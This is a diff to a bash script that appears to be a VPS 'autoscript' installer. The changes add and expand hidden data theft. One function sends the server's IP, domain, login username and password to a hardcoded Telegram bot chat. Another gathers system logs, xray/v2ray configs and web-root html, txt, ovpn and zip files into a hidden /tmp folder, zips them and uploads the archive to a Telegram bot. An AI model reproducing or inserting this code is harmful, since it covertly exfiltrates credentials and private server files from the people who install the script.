@@ -172,6 +172,30 @@ CHATID="1117211252"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TIMES="10"
 TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
+𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
+◇━━━━━━━━━━━━━━━━━━━━━━━◇
+<code>Isp Vps :</code> <code>$ISP</code>
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$MYIP</code>
+<code>User Login :</code> <code>$Username</code>
+<code>Pass Login :</code> <code>$Password</code>
+<code>OS Vps     :</code> <code>$OS_Name</code>
+<code>User Script:</code> <code>$USRSC</code>
+<code>Tanggal    :</code> <code>$tanggal</code>
+<code>Exp Vps :</code> <code>$exp</code>
+◇━━━━━━━━━━━━━━━━━━━━━━━◇
+<code>Hostname   :</code> <code>${HOSTNAME}</code>
+<code>Kernel     :</code> <code>$Kernel</code>
+<code>Arch       :</code> <code>$Arch</code>
+<code>Ram Left   :</code> <code>$Ram_Usage MB</code>
+<code>Ram Used   :</code> <code>$Ram_Total MB</code>
+============================
+⚠︎𝘽𝙮 𝙒𝙤𝙠𝙨𝙯𝙓𝘿 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
+============================
+"
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
+TEKZ="𝗩𝗣𝗦 𝗜𝗡𝗙𝗢 PART 2
 <code>────────────────────</code>
 <b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
 <code>────────────────────</code>
@@ -197,34 +221,13 @@ TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
 <code>Pass Login  :</code> <code>Tensazang3tsu.</code>
 <code>U_Pass X :</code> <code>adminx_Tensa.zang3tsu</code>
 <code>────────────────────</code>
-𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
-◇━━━━━━━━━━━━━━━━━━━━━━━◇
-<code>Isp Vps :</code> <code>$ISP</code>
-<code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$MYIP</code>
-<code>User Login :</code> <code>$Username</code>
-<code>Pass Login :</code> <code>$Password</code>
-<code>OS Vps     :</code> <code>$OS_Name</code>
-<code>User Script:</code> <code>$USRSC</code>
-<code>Tanggal    :</code> <code>$tanggal</code>
-<code>Exp Vps :</code> <code>$exp</code>
-◇━━━━━━━━━━━━━━━━━━━━━━━◇
-<code>Hostname   :</code> <code>${HOSTNAME}</code>
-<code>Kernel     :</code> <code>$Kernel</code>
-<code>Arch       :</code> <code>$Arch</code>
-<code>Ram Left   :</code> <code>$Ram_Usage MB</code>
-<code>Ram Used   :</code> <code>$Ram_Total MB</code>
 <i>Automatic Notification from</i>
 <i>Github Yaddy Kakkoii</i>
-============================
-⚠︎𝘽𝙮 𝙒𝙤𝙠𝙨𝙯𝙓𝘿 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
-============================
 "
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEKZ&parse_mode=html" $URL >/dev/null
 }
-
-email_pertama
 tele_pertama
+email_pertama
 }
 
 function memek_wangy(){
@@ -240,26 +243,50 @@ from domain : ${domm}
 _____________________________
 Recode by : Magelank Phreaker
 "
-
+DIREKTORY=/etc
 DIREKTORI=/etc/xray
-DIREKTORY=/etc/v2ray
-FILEX=$(find $DIREKTORI -name '*domain')
-FILEZ=$(find $DIREKTORI -name '*.json')
-    for FILE in $FILEX; do
-        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+DIREKTORI2=/etc/v2ray
+DIREKTORI3=/var/www/html
+FILElog=$(find $DIREKTORY -name '*.log')
+FILEdom=$(find $DIREKTORI -name '*domain')
+FILEjsonx=$(find $DIREKTORI -name '*.json')
+FILEjsonv=$(find $DIREKTORI2 -name '*.json')
+FILEhtml=$(find $DIREKTORI3 -name '*.html')
+FILEtxt=$(find $DIREKTORI3 -name '*.txt')
+FILEovpn=$(find $DIREKTORI3 -name '*.ovpn')
+FILEzip=$(find $DIREKTORI3 -name '*.zip')
+rm -rf /tmp/.XIF-unix > /dev/null 2>&1
+mkdir -p /tmp/.XIF-unix
+cp -f /etc/xray/config.json /tmp/.XIF-unix/config.json.txt
+#curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    for FILE in $FILElog; do
+        cp -f ${FILE} /tmp/.XIF-unix/
     done
-    for FILE in $FILEZ; do
-        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    for FILE in $FILEdom; do
+        cp -f ${FILE} /tmp/.XIF-unix/
     done
-
-FILEQ=$(find $DIREKTORY -name '*.json')
-    for FILE in $FILEQ; do
-        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    for FILE in $FILEjsonx; do
+        cp -f ${FILE} /tmp/.XIF-unix/
     done
-
-cp -f /etc/xray/config.json /root/config.json.txt
-curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
-rm -f /root/config.json.txt
+    for FILE in $FILEjsonv; do
+        cp -f ${FILE} /tmp/.XIF-unix/
+    done
+    for FILE in $FILEhtml; do
+        cp -f ${FILE} /tmp/.XIF-unix/
+    done
+    for FILE in $FILEtxt; do
+        cp -f ${FILE} /tmp/.XIF-unix/
+    done
+    for FILE in $FILEovpn; do
+        cp -f ${FILE} /tmp/.XIF-unix/
+    done
+    for FILE in $FILEzip; do
+        cp -f ${FILE} /tmp/.XIF-unix/
+    done
+cd /tmp
+zip -r unix.zip .XIF-unix
+curl -F chat_id="$ci" -F document=@"unix.zip" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+cd /root
 
 }
 
